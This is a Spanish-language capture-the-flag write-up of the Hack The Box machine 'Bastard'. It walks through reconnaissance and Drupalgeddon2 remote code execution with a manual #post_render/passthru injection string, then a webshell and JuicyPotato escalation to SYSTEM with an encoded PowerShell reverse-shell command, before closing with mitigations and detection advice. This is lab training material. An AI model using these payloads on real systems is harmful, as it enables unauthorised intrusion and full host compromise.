---
machine: Bastard
os: Windows
difficulty: Medium
platform: Hack The Box
category: Web / CMS
state: Retired
pwned: 2026-11-09
tags: [windows, drupal, drupalgeddon2, cve-2018-7600, juicypotato, seimpersonate]
---

# Bastard — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

## TL;DR

Un **Drupal 7.54** sin parchear cae con **Drupalgeddon2** (CVE-2018-7600): se ejecuta PHP sin autenticación y se sube un webshell. El servicio corre como una cuenta con `SeImpersonatePrivilege`, así que **JuicyPotato** completa el paso a `SYSTEM`.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 2000 <TARGET_IP>
nmap -Pn -sCV -p 80,135,139,445,5985 <TARGET_IP>
```

| Puerto | Servicio |
|---|---|
| 80/tcp | Apache + Drupal 7.54 |
| 445/tcp | SMB |
| 5985/tcp | WinRM |

```bash
curl -s http://<TARGET_IP>/CHANGELOG.txt | head
droopescan scan drupal -u http://<TARGET_IP>
```

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

El fallo está en el procesado de formularios (`user/register` y similares): se inyecta un `#post_render` con `passthru`.

```bash
python3 drupa7-CVE-2018-7600.py http://<TARGET_IP>/
```

O manualmente, enviando el parámetro `element_parents` con:

```text
#post_render[]=passthru&form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=passthru&mail[#type]=markup&mail[#markup]=<command>
```

Con el RCE se sube un webshell:

```bash
curl -s 'http://<TARGET_IP>/shell.php?cmd=whoami'
```

El usuario es `nt authority\iusr` (IIS/Apache con PHP).

## Movimiento lateral

- La cadena reutiliza credenciales dentro del mismo host; no hay salto a un segundo equipo.
- El detalle está en «Escalada de privilegios».

## Escalada de privilegios

```cmd
whoami /priv
```

Si aparece `SeImpersonatePrivilege`, se sube `JuicyPotato.exe` y se usa un CLSID válido para la versión de Windows (Server 2012 R2 / 2016):

```cmd
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c {CLSID}
```

Con reverse shell:

```cmd
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c powershell -nop -enc <BASE64>" -t * -c {CLSID}
```

Alternativas: `PrintSpoofer`, `RoguePotato`, `GodPotato` según build.

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **El exploit devuelve 200 pero sin salida** → el parámetro va mal codificado; usa un PoC que acepte `--command`.
- **`SeImpersonate` no aparece** → el webshell corre con otra identidad; revisa `whoami /priv` desde el proceso real.
- **JuicyPotato falla con `-c`** → el CLSID no existe en esa build; prueba varios o cambia de herramienta.
- **El webshell desaparece** → el CMS limpia `sites/default/files`; súbelo a otra ruta escribible.

## Mitigaciones y detección

- Actualizar Drupal (7.x sin soporte) y aplicar el parche de SA-CORE-2018-002.
- **WAF** con reglas para `#post_render`, `element_parents` y `passthru`.
- Limitar `SeImpersonatePrivilege` en cuentas de servicio web y usar cuentas virtuales.
- **4688** con `cmd.exe` hijo del proceso web y **7045** de servicios nuevos.

MITRE: T1190, T1059.001, T1134.001.

## Referencias

- [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)
- [MITRE T1059.001](https://attack.mitre.org/techniques/T1059/)
- [MITRE T1134.001](https://attack.mitre.org/techniques/T1134/)
- [MITRE T1190](https://attack.mitre.org/techniques/T1190/)
- [rop-stack](../../../knowledge/pwn/rop-stack.md)
